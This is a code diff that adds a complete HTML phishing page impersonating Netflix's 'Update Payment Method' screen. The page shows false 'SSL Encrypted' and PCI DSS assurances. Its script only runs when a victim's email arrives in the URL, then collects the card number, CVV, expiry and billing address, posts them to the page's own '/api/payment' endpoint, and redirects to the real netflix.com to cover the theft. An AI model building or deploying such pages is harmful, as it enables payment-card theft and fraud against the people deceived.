@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Netflix | Update Payment Method</title>
+<link rel="icon" href="/fav.ico" type="image/x-icon">
+<style>
+@font-face{font-family:'Bebas Neue';src:url('/fonts/BebasNeue-Regular.ttf') format('truetype');font-weight:400;font-style:normal;font-display:swap}:root{--netflix-red:#E50914;--netflix-red-hover:#f6121d;--netflix-dark:#141414;--netflix-dark-2:#1a1a1a;--netflix-card:#1f1f1f;--netflix-card-hover:#2a2a2a;--netflix-border:#333;--netflix-text:#fff;--netflix-text-secondary:#b3b3b3;--netflix-text-muted:#737373;--netflix-input-bg:#333;--netflix-input-focus:#454545;--netflix-success:#46d369;--netflix-error:#eb3942;--font-primary:'Helvetica Neue',Helvetica,Arial,sans-serif;--shadow-lg:0 10px 40px rgba(0,0,0,0.6);--shadow-md:0 4px 20px rgba(0,0,0,0.4);--radius-sm:4px;--radius-md:8px;--radius-lg:12px;--transition:0.2s cubic-bezier(0.4,0,0.2,1)}*{margin:0;padding:0;box-sizing:border-box}body{font-family:var(--font-primary);background-color:var(--netflix-dark);color:var(--netflix-text);min-height:100vh;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;background-image:radial-gradient(ellipse at 30% 20%,rgba(229,9,20,0.06) 0%,transparent 60%),radial-gradient(ellipse at 70% 60%,rgba(229,9,20,0.04) 0%,transparent 50%),radial-gradient(ellipse at 50% 0%,rgba(255,255,255,0.02) 0%,transparent 40%);display:flex;flex-direction:column}.navbar{display:flex;align-items:center;justify-content:space-between;padding:18px 40px;background:linear-gradient(180deg,rgba(0,0,0,0.95) 0%,rgba(20,20,20,0.85) 80%,transparent 100%);position:sticky;top:0;z-index:100;backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px)}.nav-logo{display:flex;align-items:center;gap:32px}.logo-wordmark{font-family:'Bebas Neue',sans-serif;font-size:2.2rem;font-weight:400;letter-spacing:0.08em;color:var(--netflix-red);text-transform:uppercase;line-height:1;cursor:pointer;transition:opacity var(--transition);user-select:none}.logo-wordmark:hover{opacity:0.85}.nav-breadcrumb{display:flex;align-items:center;gap:10px;font-size:0.95rem;color:var(--netflix-text-secondary);letter-spacing:0.02em}.nav-breadcrumb span{color:var(--netflix-text-muted);font-weight:300}.nav-breadcrumb .current{color:var(--netflix-text);font-weight:500}.nav-user{display:flex;align-items:center;gap:16px}.secure-badge-nav{display:flex;align-items:center;gap:6px;font-size:0.78rem;color:var(--netflix-success);font-weight:500;letter-spacing:0.03em}.secure-badge-nav svg{width:14px;height:14px}.main-container{max-width:720px;margin:0 auto;padding:20px 24px 60px;flex:1}.section-title{font-size:1.65rem;font-weight:700;margin-bottom:6px;letter-spacing:-0.01em}.section-subtitle{font-size:0.95rem;color:var(--netflix-text-secondary);margin-bottom:24px;line-height:1.5;font-weight:400}.payment-card{background:var(--netflix-card);border:1px solid var(--netflix-border);border-radius:var(--radius-lg);padding:28px;margin-bottom:28px;transition:border-color var(--transition),box-shadow var(--transition)}.payment-card:hover{border-color:#444;box-shadow:var(--shadow-md)}.payment-card-header{margin-bottom:22px}.payment-card-header h3{font-size:1.15rem;font-weight:600;letter-spacing:-0.01em}.form-group{margin-bottom:18px}.form-group label{display:block;font-size:0.85rem;font-weight:500;color:var(--netflix-text-secondary);margin-bottom:6px;letter-spacing:0.02em}.form-group input,.form-group select{width:100%;padding:14px 16px;background:var(--netflix-input-bg);border:2px solid transparent;border-radius:var(--radius-sm);color:var(--netflix-text);font-size:1rem;font-family:var(--font-primary);transition:all var(--transition);outline:none;letter-spacing:0.02em}.form-group input::placeholder{color:#666}.form-group input:focus,.form-group select:focus{background:var(--netflix-input-focus);border-color:var(--netflix-red);box-shadow:0 0 0 3px rgba(229,9,20,0.15)}.form-group input.error{border-color:var(--netflix-error)}.form-group input.valid{border-color:var(--netflix-success)}.form-row{display:grid;grid-template-columns:1fr 1fr;gap:16px}.form-row-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px}.error-message{font-size:0.78rem;color:var(--netflix-error);margin-top:4px;display:none;font-weight:500;letter-spacing:0.02em;animation:fadeIn 0.2s ease}.error-message.show{display:block}@keyframes fadeIn{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:translateY(0)}}.card-preview{background:linear-gradient(145deg,#2c2c2c 0%,#1a1a1a 100%);border-radius:var(--radius-md);padding:20px 24px;margin-bottom:22px;border:1px solid #3a3a3a;position:relative;overflow:hidden;min-height:100px}.card-preview::after{content:'';position:absolute;top:-30px;right:-30px;width:120px;height:120px;border-radius:50%;background:rgba(229,9,20,0.08);pointer-events:none}.card-preview-chip{width:32px;height:24px;background:linear-gradient(135deg,#d4af37,#c9a030);border-radius:4px;margin-bottom:14px;opacity:0.8}.card-preview-number{font-family:'Courier New',monospace;font-size:1.3rem;letter-spacing:0.12em;color:#ddd;margin-bottom:10px;font-weight:600}.card-preview-details{display:flex;gap:30px;font-size:0.8rem;color:#999;letter-spacing:0.05em}.card-preview-details span{text-transform:uppercase;font-weight:500}.billing-section{margin-top:8px}.billing-section h4{font-size:1rem;font-weight:600;margin-bottom:16px;color:var(--netflix-text-secondary)}.billing-address-fields{animation:fadeIn 0.3s ease}.action-buttons{display:flex;justify-content:center;margin-top:32px}.btn-primary{background:var(--netflix-red);color:#fff;border:none;padding:15px 48px;font-size:1.05rem;font-weight:700;border-radius:var(--radius-sm);cursor:pointer;transition:all var(--transition);letter-spacing:0.03em;min-width:240px;text-align:center}.btn-primary:hover{background:var(--netflix-red-hover);transform:translateY(-1px);box-shadow:0 8px 25px rgba(229,9,20,0.4)}.btn-primary:active{transform:scale(0.97)}.btn-primary:disabled{opacity:0.5;cursor:not-allowed;pointer-events:none}.secure-note{display:flex;align-items:center;gap:8px;margin-top:20px;font-size:0.82rem;color:var(--netflix-text-muted);letter-spacing:0.02em;justify-content:center}.secure-note svg{width:16px;height:16px;color:var(--netflix-success)}.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(120px);background:var(--netflix-success);color:#000;padding:14px 28px;border-radius:30px;font-weight:700;font-size:0.95rem;z-index:999;letter-spacing:0.02em;box-shadow:0 12px 35px rgba(0,0,0,0.5);transition:transform 0.4s cubic-bezier(0.175,0.885,0.32,1.275);pointer-events:none}.toast.show{transform:translateX(-50%) translateY(0)}.toast.error-toast{background:var(--netflix-error);color:#fff}@media(max-width:600px){.navbar{padding:14px 16px}.nav-breadcrumb{display:none}.main-container{padding:12px 14px 40px}.section-title{font-size:1.35rem}.form-row,.form-row-3{grid-template-columns:1fr}.payment-card{padding:18px 16px}.card-preview{padding:14px 16px}.card-preview-number{font-size:1rem}.btn-primary{width:100%;min-width:auto}.logo-wordmark{font-size:1.8rem}}
+</style>
+</head>
+<body>
+<nav class="navbar"><div class="nav-logo"><div class="logo-wordmark" onclick="window.location.reload();" title="Netflix" style="cursor:pointer;">NETFLIX</div><div class="nav-breadcrumb"><span>Account</span> › <span class="current">Update Payment</span></div></div><div class="nav-user"><div class="secure-badge-nav"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg> SSL Encrypted</div></div></nav><div class="main-container"><h1 class="section-title">Update Payment Method</h1><p class="section-subtitle">Keep your payment info current to enjoy uninterrupted streaming.</p><div class="payment-card"><div class="payment-card-header"><h3>💳 Credit / Debit Card</h3></div><div class="card-preview" id="cardPreview"><div class="card-preview-chip"></div><div class="card-preview-number" id="previewNumber">•••• •••• •••• ••••</div><div class="card-preview-details"><span id="previewName">YOUR NAME</span><span id="previewExpiry">MM/YY</span></div></div><form id="paymentForm" novalidate><input type="hidden" id="email" name="email"><div class="form-group"><label for="cardNumber">Card Number</label><input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" autocomplete="cc-number"><p class="error-message" id="cardNumberError">Please enter a valid card number.</p></div><div class="form-group"><label for="cardName">Name on Card</label><input type="text" id="cardName" name="cardName" placeholder="John Doe" autocomplete="cc-name"><p class="error-message" id="cardNameError">Please enter the name on your card.</p></div><div class="form-row"><div class="form-group"><label for="expiryDate">Expiry Date</label><input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" maxlength="5" autocomplete="cc-exp"><p class="error-message" id="expiryError">Invalid expiry date.</p></div><div class="form-group"><label for="cvv">Security Code (CVV)</label><input type="text" id="cvv" name="cvv" placeholder="•••" maxlength="4" autocomplete="cc-csc"><p class="error-message" id="cvvError">Invalid security code.</p></div></div><div class="billing-section"><h4>Billing Address</h4><div class="billing-address-fields"><div class="form-group"><label for="address1">Address Line 1 *</label><input type="text" id="address1" placeholder="123 Example Street" autocomplete="address-line1" required><p class="error-message" id="address1Error">Address line 1 is required.</p></div><div class="form-group"><label for="address2">Address Line 2 (Optional)</label><input type="text" id="address2" placeholder="Apt, suite, unit, etc." autocomplete="address-line2"></div><div class="form-row-3"><div class="form-group"><label for="city">City *</label><input type="text" id="city" placeholder="City" autocomplete="address-level2" required><p class="error-message" id="cityError">City is required.</p></div><div class="form-group"><label for="postcode">Postal Code *</label><input type="text" id="postcode" placeholder="12345" autocomplete="postal-code" required><p class="error-message" id="postcodeError">Postal code is required.</p></div><div class="form-group"><label for="country">Country *</label><select id="country" autocomplete="country" required><option value="">Select country</option><option value="AF">Afghanistan</option><option value="AL">Albania</option><option value="DZ">Algeria</option><option value="AD">Andorra</option><option value="AO">Angola</option><option value="AG">Antigua and Barbuda</option><option value="AR">Argentina</option><option value="AM">Armenia</option><option value="AU">Australia</option><option value="AT">Austria</option><option value="AZ">Azerbaijan</option><option value="BS">Bahamas</option><option value="BH">Bahrain</option><option value="BD">Bangladesh</option><option value="BB">Barbados</option><option value="BY">Belarus</option><option value="BE">Belgium</option><option value="BZ">Belize</option><option value="BJ">Benin</option><option value="BT">Bhutan</option><option value="BO">Bolivia</option><option value="BA">Bosnia and Herzegovina</option><option value="BW">Botswana</option><option value="BR">Brazil</option><option value="BN">Brunei</option><option value="BG">Bulgaria</option><option value="BF">Burkina Faso</option><option value="BI">Burundi</option><option value="CV">Cabo Verde</option><option value="KH">Cambodia</option><option value="CM">Cameroon</option><option value="CA">Canada</option><option value="CF">Central African Republic</option><option value="TD">Chad</option><option value="CL">Chile</option><option value="CN">China</option><option value="CO">Colombia</option><option value="KM">Comoros</option><option value="CG">Congo (Brazzaville)</option><option value="CR">Costa Rica</option><option value="CI">Côte d'Ivoire</option><option value="HR">Croatia</option><option value="CU">Cuba</option><option value="CY">Cyprus</option><option value="CZ">Czech Republic</option><option value="DK">Denmark</option><option value="DJ">Djibouti</option><option value="DM">Dominica</option><option value="DO">Dominican Republic</option><option value="CD">DR Congo</option><option value="EC">Ecuador</option><option value="EG">Egypt</option><option value="SV">El Salvador</option><option value="GQ">Equatorial Guinea</option><option value="ER">Eritrea</option><option value="EE">Estonia</option><option value="SZ">Eswatini</option><option value="ET">Ethiopia</option><option value="FJ">Fiji</option><option value="FI">Finland</option><option value="FR">France</option><option value="GA">Gabon</option><option value="GM">Gambia</option><option value="GE">Georgia</option><option value="DE">Germany</option><option value="GH">Ghana</option><option value="GR">Greece</option><option value="GD">Grenada</option><option value="GT">Guatemala</option><option value="GN">Guinea</option><option value="GW">Guinea-Bissau</option><option value="GY">Guyana</option><option value="HT">Haiti</option><option value="HN">Honduras</option><option value="HU">Hungary</option><option value="IS">Iceland</option><option value="IN">India</option><option value="ID">Indonesia</option><option value="IR">Iran</option><option value="IQ">Iraq</option><option value="IE">Ireland</option><option value="IL">Israel</option><option value="IT">Italy</option><option value="JM">Jamaica</option><option value="JP">Japan</option><option value="JO">Jordan</option><option value="KZ">Kazakhstan</option><option value="KE">Kenya</option><option value="KI">Kiribati</option><option value="KP">Korea, North</option><option value="KR">Korea, South</option><option value="KW">Kuwait</option><option value="KG">Kyrgyzstan</option><option value="LA">Laos</option><option value="LV">Latvia</option><option value="LB">Lebanon</option><option value="LS">Lesotho</option><option value="LR">Liberia</option><option value="LY">Libya</option><option value="LI">Liechtenstein</option><option value="LT">Lithuania</option><option value="LU">Luxembourg</option><option value="MG">Madagascar</option><option value="MW">Malawi</option><option value="MY">Malaysia</option><option value="MV">Maldives</option><option value="ML">Mali</option><option value="MT">Malta</option><option value="MH">Marshall Islands</option><option value="MR">Mauritania</option><option value="MU">Mauritius</option><option value="MX">Mexico</option><option value="FM">Micronesia</option><option value="MD">Moldova</option><option value="MC">Monaco</option><option value="MN">Mongolia</option><option value="ME">Montenegro</option><option value="MA">Morocco</option><option value="MZ">Mozambique</option><option value="MM">Myanmar</option><option value="NA">Namibia</option><option value="NR">Nauru</option><option value="NP">Nepal</option><option value="NL">Netherlands</option><option value="NZ">New Zealand</option><option value="NI">Nicaragua</option><option value="NE">Niger</option><option value="NG">Nigeria</option><option value="MK">North Macedonia</option><option value="NO">Norway</option><option value="OM">Oman</option><option value="PK">Pakistan</option><option value="PW">Palau</option><option value="PS">Palestine</option><option value="PA">Panama</option><option value="PG">Papua New Guinea</option><option value="PY">Paraguay</option><option value="PE">Peru</option><option value="PH">Philippines</option><option value="PL">Poland</option><option value="PT">Portugal</option><option value="QA">Qatar</option><option value="RO">Romania</option><option value="RU">Russia</option><option value="RW">Rwanda</option><option value="KN">Saint Kitts and Nevis</option><option value="LC">Saint Lucia</option><option value="VC">Saint Vincent and the Grenadines</option><option value="WS">Samoa</option><option value="SM">San Marino</option><option value="ST">Sao Tome and Principe</option><option value="SA">Saudi Arabia</option><option value="SN">Senegal</option><option value="RS">Serbia</option><option value="SC">Seychelles</option><option value="SL">Sierra Leone</option><option value="SG">Singapore</option><option value="SK">Slovakia</option><option value="SI">Slovenia</option><option value="SB">Solomon Islands</option><option value="SO">Somalia</option><option value="ZA">South Africa</option><option value="SS">South Sudan</option><option value="ES">Spain</option><option value="LK">Sri Lanka</option><option value="SD">Sudan</option><option value="SR">Suriname</option><option value="SE">Sweden</option><option value="CH">Switzerland</option><option value="SY">Syria</option><option value="TW">Taiwan</option><option value="TJ">Tajikistan</option><option value="TZ">Tanzania</option><option value="TH">Thailand</option><option value="TL">Timor-Leste</option><option value="TG">Togo</option><option value="TO">Tonga</option><option value="TT">Trinidad and Tobago</option><option value="TN">Tunisia</option><option value="TR">Turkey</option><option value="TM">Turkmenistan</option><option value="TV">Tuvalu</option><option value="UG">Uganda</option><option value="UA">Ukraine</option><option value="AE">United Arab Emirates</option><option value="GB">United Kingdom</option><option value="US">United States</option><option value="UY">Uruguay</option><option value="UZ">Uzbekistan</option><option value="VU">Vanuatu</option><option value="VA">Vatican City</option><option value="VE">Venezuela</option><option value="VN">Vietnam</option><option value="YE">Yemen</option><option value="ZM">Zambia</option><option value="ZW">Zimbabwe</option></select><p class="error-message" id="countryError">Please select a country.</p></div></div></div></div></form></div><div class="action-buttons"><button class="btn-primary" type="button" id="saveBtn">Update Payment Method</button></div><div class="secure-note"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg> Your payment information is encrypted and stored securely. We comply with PCI DSS standards.</div></div><div class="toast" id="toast"></div><script>
+(function(){
+  const urlEmail = new URLSearchParams(window.location.search).get("email");
+  const emailInput = document.getElementById("email");
+  if(urlEmail) emailInput.value = urlEmail;
+  if(!urlEmail) return;
+
+  const cardNumberInput = document.getElementById("cardNumber");
+  const cardNameInput = document.getElementById("cardName");
+  const expiryInput = document.getElementById("expiryDate");
+  const cvvInput = document.getElementById("cvv");
+  const saveBtn = document.getElementById("saveBtn");
+  const toastEl = document.getElementById("toast");
+  const previewNumberSpan = document.getElementById("previewNumber");
+  const previewNameSpan = document.getElementById("previewName");
+  const previewExpirySpan = document.getElementById("previewExpiry");
+
+  cardNumberInput.addEventListener("input", formatCardNumber);
+  cardNumberInput.addEventListener("input", updatePreview);
+  cardNameInput.addEventListener("input", updatePreview);
+  expiryInput.addEventListener("input", formatExpiry);
+  expiryInput.addEventListener("input", updatePreview);
+  cvvInput.addEventListener("input", function() {
+    this.value = this.value.replace(/\D/g, "");
+    if(this.value.length > 4) this.value = this.value.slice(0,4);
+  });
+
+  function formatCardNumber() {
+    let raw = this.value.replace(/\s/g, "").replace(/\D/g, "");
+    if(raw.length > 16) raw = raw.slice(0,16);
+    this.value = raw.replace(/(\d{4})(?=\d)/g, "$1 ");
+    if(raw.length >= 13 && raw.length <= 16) {
+      this.classList.add("valid");
+      this.classList.remove("error");
+    } else if(raw.length > 0) {
+      this.classList.add("error");
+      this.classList.remove("valid");
+    } else {
+      this.classList.remove("valid", "error");
+    }
+  }
+
+  function formatExpiry() {
+    let raw = this.value.replace(/\s/g, "").replace(/\D/g, "");
+    if(raw.length > 4) raw = raw.slice(0,4);
+    if(raw.length >= 2) {
+      this.value = raw.slice(0,2) + "/" + raw.slice(2);
+    } else {
+      this.value = raw;
+    }
+    const parts = this.value.split("/");
+    if(parts[0] && parseInt(parts[0]) > 12) {
+      this.classList.add("error");
+    } else if(parts[0] && parts[1] && parts[1].length === 2) {
+      this.classList.add("valid");
+      this.classList.remove("error");
+    } else if(raw.length === 0) {
+      this.classList.remove("valid", "error");
+    }
+  }
+
+  // Fixed function: no variable shadowing
+  function updatePreview() {
+    let rawCard = cardNumberInput.value.replace(/\s/g, "");
+    let preview = "";
+    for(let i = 0; i < rawCard.length; i++) {
+      preview += i < rawCard.length - 4 ? "•" : rawCard[i];
+      if((i+1) % 4 === 0 && i < rawCard.length - 1) preview += " ";
+    }
+    const groups = Math.ceil(rawCard.length / 4) || 0;
+    const missing = 4 - groups;
+    if(missing > 0) {
+      preview += (preview ? " " : "") + "•••• ".repeat(missing).trim();
+    }
+    previewNumberSpan.textContent = preview.trim() || "•••• •••• •••• ••••";
+    // Use the original input elements (not shadowed)
+    previewNameSpan.textContent = cardNameInput.value.trim() || "YOUR NAME";
+    previewExpirySpan.textContent = expiryInput.value.trim() || "MM/YY";
+  }
+
+  function validateForm() {
+    let isValid = true;
+    const rawCard = cardNumberInput.value.replace(/\s/g, "");
+    const cardNumberError = document.getElementById("cardNumberError");
+    if(rawCard.length < 13 || rawCard.length > 16 || !/^\d+$/.test(rawCard)) {
+      cardNumberError.classList.add("show");
+      cardNumberInput.classList.add("error");
+      cardNumberInput.classList.remove("valid");
+      isValid = false;
+    } else {
+      cardNumberError.classList.remove("show");
+      cardNumberInput.classList.remove("error");
+      cardNumberInput.classList.add("valid");
+    }
+
+    if(isValid) {
+      const name = cardNameInput.value.trim();
+      const nameError = document.getElementById("cardNameError");
+      if(name.length < 2 || !/[a-zA-Z]/.test(name)) {
+        nameError.classList.add("show");
+        cardNameInput.classList.add("error");
+        cardNameInput.classList.remove("valid");
+        isValid = false;
+      } else {
+        nameError.classList.remove("show");
+        cardNameInput.classList.remove("error");
+        cardNameInput.classList.add("valid");
+      }
+    }
+
+    if(isValid) {
+      const expiryVal = expiryInput.value.trim();
+      const expiryError = document.getElementById("expiryError");
+      const parts = expiryVal.split("/");
+      if(parts.length !== 2 || !/^\d{2}$/.test(parts[0]) || !/^\d{2}$/.test(parts[1])) {
+        expiryError.classList.add("show");
+        expiryInput.classList.add("error");
+        expiryInput.classList.remove("valid");
+        isValid = false;
+      } else {
+        expiryError.classList.remove("show");
+        expiryInput.classList.remove("error");
+        expiryInput.classList.add("valid");
+      }
+
+      if(isValid) {
+        const month = parseInt(parts[0]);
+        const year = parseInt("20" + parts[1]);
+        const now = new Date();
+        const currentMonth = now.getMonth() + 1;
+        const currentYear = now.getFullYear();
+        if(month < 1 || month > 12 || year < currentYear || (year === currentYear && month < currentMonth)) {
+          expiryError.classList.add("show");
+          expiryInput.classList.add("error");
+          expiryInput.classList.remove("valid");
+          isValid = false;
+        } else {
+          expiryError.classList.remove("show");
+          expiryInput.classList.remove("error");
+          expiryInput.classList.add("valid");
+        }
+      }
+    }
+
+    if(isValid) {
+      const cvv = cvvInput.value.trim();
+      const cvvError = document.getElementById("cvvError");
+      const firstDigit = rawCard.charAt(0);
+      const isAmex = firstDigit === "3" && (rawCard.charAt(1) === "4" || rawCard.charAt(1) === "7");
+      const requiredLength = isAmex ? 4 : 3;
+      if(cvv.length !== requiredLength || !/^\d+$/.test(cvv)) {
+        cvvError.classList.add("show");
+        cvvInput.classList.add("error");
+        cvvInput.classList.remove("valid");
+        isValid = false;
+      } else {
+        cvvError.classList.remove("show");
+        cvvInput.classList.remove("error");
+        cvvInput.classList.add("valid");
+      }
+    }
+
+    if(isValid) {
+      const addr1 = document.getElementById("address1").value.trim();
+      const city = document.getElementById("city").value.trim();
+      const postcode = document.getElementById("postcode").value.trim();
+      const country = document.getElementById("country").value;
+      const addr1Error = document.getElementById("address1Error");
+      const cityError = document.getElementById("cityError");
+      const postcodeError = document.getElementById("postcodeError");
+      const countryError = document.getElementById("countryError");
+
+      if(!addr1) { addr1Error.classList.add("show"); document.getElementById("address1").classList.add("error"); isValid = false; }
+      else { addr1Error.classList.remove("show"); document.getElementById("address1").classList.remove("error"); }
+
+      if(!city) { cityError.classList.add("show"); document.getElementById("city").classList.add("error"); isValid = false; }
+      else { cityError.classList.remove("show"); document.getElementById("city").classList.remove("error"); }
+
+      if(!postcode) { postcodeError.classList.add("show"); document.getElementById("postcode").classList.add("error"); isValid = false; }
+      else { postcodeError.classList.remove("show"); document.getElementById("postcode").classList.remove("error"); }
+
+      if(!country) { countryError.classList.add("show"); document.getElementById("country").classList.add("error"); isValid = false; }
+      else { countryError.classList.remove("show"); document.getElementById("country").classList.remove("error"); }
+    }
+    return isValid;
+  }
+
+  function showToast(msg, isError = false) {
+    toastEl.textContent = msg;
+    if(isError) toastEl.classList.add("error-toast");
+    else toastEl.classList.remove("error-toast");
+    toastEl.classList.add("show");
+    clearTimeout(toastEl._timeout);
+    toastEl._timeout = setTimeout(() => toastEl.classList.remove("show"), 3000);
+  }
+
+  saveBtn.addEventListener("click", async function() {
+    if(!validateForm()) {
+      showToast("⚠️ Please fix the errors before saving.", true);
+      const firstError = document.querySelector(".error-message.show");
+      if(firstError) firstError.scrollIntoView({ behavior: "smooth", block: "center" });
+      return;
+    }
+
+    const payload = {
+      email: emailInput.value,
+      cardNumber: cardNumberInput.value.replace(/\s/g, ""),
+      cardName: cardNameInput.value.trim(),
+      expiryDate: expiryInput.value.trim(),
+      cvv: cvvInput.value.trim(),
+      billingAddress: {
+        line1: document.getElementById("address1").value.trim(),
+        line2: document.getElementById("address2").value.trim(),
+        city: document.getElementById("city").value.trim(),
+        postcode: document.getElementById("postcode").value.trim(),
+        country: document.getElementById("country").value
+      }
+    };
+
+    saveBtn.disabled = true;
+    saveBtn.textContent = "⏳ Saving...";
+    try {
+      const response = await fetch("/api/payment", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+      const data = await response.json();
+      if(response.ok) {
+        showToast("✅ Payment updated! Redirecting...");
+        setTimeout(() => { window.location.href = "https://www.netflix.com"; }, 1500);
+      } else {
+        throw new Error(data.message || "Server error");
+      }
+    } catch(err) {
+      console.error("Submit error:", err);
+      showToast("❌ Failed to update payment. " + (err.message || "Please try again."), true);
+    } finally {
+      saveBtn.disabled = false;
+      saveBtn.textContent = "Update Payment Method";
+    }
+  });
+
+  document.addEventListener("keydown", function(e) {
+    if((e.ctrlKey || e.metaKey) && e.key === "Enter") {
+      e.preventDefault();
+      saveBtn.click();
+    }
+  });
+})();
+</script>
+</body>
+</html>
